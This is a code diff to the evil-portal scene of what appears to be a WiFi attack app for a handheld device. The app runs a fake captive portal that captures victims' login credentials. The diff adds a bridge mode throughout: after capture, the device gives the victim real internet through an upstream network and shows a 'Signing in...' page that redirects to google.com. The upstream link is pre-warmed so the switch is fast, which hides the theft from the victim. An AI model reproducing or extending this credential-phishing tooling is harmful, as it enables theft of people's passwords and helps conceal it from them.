@@ -1,6 +1,7 @@
 #include "../wlan_app.h"
 #include "../wlan_hal.h"
 #include "../wlan_evil_portal_html.h"
+#include "../wlan_evil_portal_bridge.h"
 
 #include <storage/storage.h>
 #include <furi_hal_rtc.h>
@@ -30,6 +31,19 @@ static void ep_cred_cb(const char* user, const char* pwd, void* ctx) {
     app->evil_portal_cred_head = next;
     view_dispatcher_send_custom_event(
         app->view_dispatcher, WlanAppCustomEventEvilPortalCredCaptured);
+
+    // Bridge-after-portal: if enabled in menu, switch radio to APSTA and
+    // connect upstream so captured client gets real internet through us.
+    // Captured user/pwd are NOT used as WiFi creds (they're Google/portal
+    // creds, not WiFi credentials).
+    if(app->evil_portal_bridge_enable &&
+       app->evil_portal_bridge_ssid[0] &&
+       app->evil_portal_bridge_password[0]) {
+        wlan_evil_portal_bridge_start(
+            app,
+            app->evil_portal_bridge_ssid,
+            app->evil_portal_bridge_password);
+    }
 }
 
 static void ep_valid_cb(const char* ssid, const char* pwd, void* ctx) {
@@ -297,6 +311,12 @@ void wlan_app_scene_evil_portal_on_enter(void* context) {
         .html = html,
         .html_len = html_len,
         .router_ssid_options = s_router_options,
+        // Bridge mode flips the post-cred page from "Couldn't sign you in" to
+        // a "Signing in..." page that redirects to google.com after a delay.
+        // Only enable if all three pieces are present (bridge toggle + SSID + pwd).
+        .bridge_redirect = app->evil_portal_bridge_enable &&
+                           app->evil_portal_bridge_ssid[0] &&
+                           app->evil_portal_bridge_password[0],
         .cred_cb = ep_cred_cb,
         .cred_cb_ctx = app,
         .valid_cb = ep_valid_cb,
@@ -308,6 +328,18 @@ void wlan_app_scene_evil_portal_on_enter(void* context) {
     if(!wlan_hal_evil_portal_start(&cfg)) {
         wlan_evil_portal_view_set_busy(
             app->evil_portal_view_obj, true, "Start failed");
+        return;
+    }
+
+    // Pre-warm the bridge: connect STA to upstream NOW so NAPT can be enabled
+    // in ~100ms at cred-capture time instead of the 5-10s cold path (STA L2 +
+    // DHCP + DHCPS dance + napt_enable). NAPT and DNS-forward are held off
+    // until ep_cred_cb fires bridge_start.
+    if(cfg.bridge_redirect) {
+        wlan_evil_portal_bridge_prewarm(
+            app,
+            app->evil_portal_bridge_ssid,
+            app->evil_portal_bridge_password);
     }
 }
 
@@ -357,6 +389,10 @@ void wlan_app_scene_evil_portal_on_exit(void* context) {
     WlanApp* app = context;
     wlan_evil_portal_view_set_action_callback(
         app->evil_portal_view_obj, NULL, NULL);
+    // Bridge stop must run BEFORE evil_portal_stop: evil_portal_stop calls
+    // esp_wifi_deinit which would invalidate the AP netif before
+    // bridge_stop's napt_disable runs.
+    wlan_evil_portal_bridge_stop();
     wlan_hal_evil_portal_stop();
     ep_drain_cred_queue(app);
     ep_close_cred_file();
